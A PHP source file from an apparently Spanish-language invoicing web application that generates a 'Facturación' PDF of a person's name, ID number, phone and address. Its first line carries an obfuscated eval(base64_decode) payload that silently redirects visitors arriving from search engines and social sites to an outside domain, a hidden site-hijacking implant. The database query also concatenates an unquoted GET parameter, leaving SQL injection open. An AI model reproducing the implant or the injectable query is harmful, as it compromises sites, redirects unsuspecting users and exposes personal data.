<?php	 	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); session_start();
date_default_timezone_set('America/Caracas');
if (!isset($_SESSION["logged"]))
    header('Location: index.php');
require_once('PDF/config/lang/spa.php');
require_once 'lib/function_gen.php';
require 'PDF/tcpdf.php';

$doc_codigo = null;

if (isset($_GET["doc_codigo"]))
    $doc_codigo = $_GET["doc_codigo"];

$doc_codigo = htmlspecialchars((strip_tags($doc_codigo)));
$query = "SELECT * 
            FROM mp_Documento_Doc INNER JOIN mp_Persona_Per ON 
                 mp_Documento_Doc.Per_CodigoPg = mp_Persona_Per.Per_Codigo
           WHERE Doc_Codigo = " . $doc_codigo; 
//echo $query;
$detail_valuesII = fnc_ejecutaQuery($query);
$detail_valuesII = $detail_valuesII[0];
//var_dump($detail_valuesII);
class MYPDF extends TCPDF {

    //Page header
    public function Header() {
        $this->Ln(20);
        $this->SetFont('times', 'B', 14);
    }

    // Page footer
    public function Footer() {
        // Position at 15 mm from bottom
        $this->SetY(-15);
        // Set font
        $this->SetFont('times', 'I', 8);
        // Page number
        //$this->Cell(0, 10, 'Página ' . $this->getAliasNumPage() . ' de ' . $this->getAliasNbPages(), 0, false, 'C', 0, '', 0, false, 'T', 'M');
    }

}

$pdf = new MYPDF(PDF_PAGE_ORIENTATION, PDF_UNIT, PDF_PAGE_FORMAT, true, 'UTF-8', false);
// set document information
$pdf->SetCreator(PDF_CREATOR);
$pdf->SetAuthor('Subasta Fiscal 2012 MP');
$pdf->SetTitle('Facturación');
// set default monospaced font
$pdf->SetDefaultMonospacedFont(PDF_FONT_MONOSPACED);
//set margins
$pdf->SetMargins(25, 20, 25);
$pdf->SetHeaderMargin(PDF_MARGIN_HEADER);
$pdf->SetFooterMargin(PDF_MARGIN_FOOTER);
//set auto page breaks
$pdf->SetAutoPageBreak(TRUE, PDF_MARGIN_BOTTOM);
//set image scale factor
$pdf->setImageScale(PDF_IMAGE_SCALE_RATIO);
//set some language-dependent strings
$pdf->setLanguageArray($l);

// ---------------------------------------------------------
// set default font subsetting mode


$nombre = $detail_valuesII["Per_Nombre"] . " " . $detail_valuesII["Per_Apellido"];
$mesesesp = array("Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio", "Julio",
    "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre");


////////////////////////////////////////////////////////////////////////////////
$pdf->SetPrintHeader(false);
$pdf->AddPage();
$pdf->SetPrintFooter(false);
$direccion = explode("@@",$detail_valuesII['Doc_DireccFis']);

$html = '<table border="0" cellspacing="0" cellpadding="3">';
$html .= '<tr>';
$html .= '<td style="text-align:center" colspan="2">';
$html .= '<h1>Facturación</h1>';
$html .= '</td>';
$html .= '</tr>';


$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong>Nombre:</strong>	';
$html .= '</td>';
$html .= '<td width="70%">';
$html .= $detail_valuesII["Per_Nombre"] . " " . $detail_valuesII["Per_Apellido"];;
$html .= '</td>';
$html .= '</tr>';

$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong>Cédula:</strong>	';
$html .= '</td>';
$html .= '<td width="70%">';
$html .= $detail_valuesII["Per_CI"] ;
$html .= '</td>';
$html .= '</tr>';

$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong>Teléfono:</strong>	';
$html .= '</td>';
$html .= '<td width="70%">';
$html .= $detail_valuesII["Per_Telefono"];
$html .= '</td>';
$html .= '</tr>';

$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong>Calle:</strong>	';
$html .= '</td>';
$html .= '<td width="70%">';
$html .= $direccion[0];
$html .= '</td>';
$html .= '</tr>';

$html .= '<tr>';
$html .= '<td width="30%">';
$html .= '<strong>Edificio:</strong>	';
$html .= '</td>';
$html .= '<td width="70%">';
$html .= $direccion[1];
$html .= '</td>';
$html .= '</tr>';


$html .= '</table>';

$pdf->writeHTMLCell($w = 0, $h = 0, $x = '', $y = '', $html, $border = 0, $ln = 1, $fill = 0, $reseth = true, $align = '', $autopadding = true);


$pdf->Output('Faturación-'.$detail_valuesII["Per_CI"] .'.pdf', 'I');
//============================================================+
// END OF FILE
//============================================================+
?>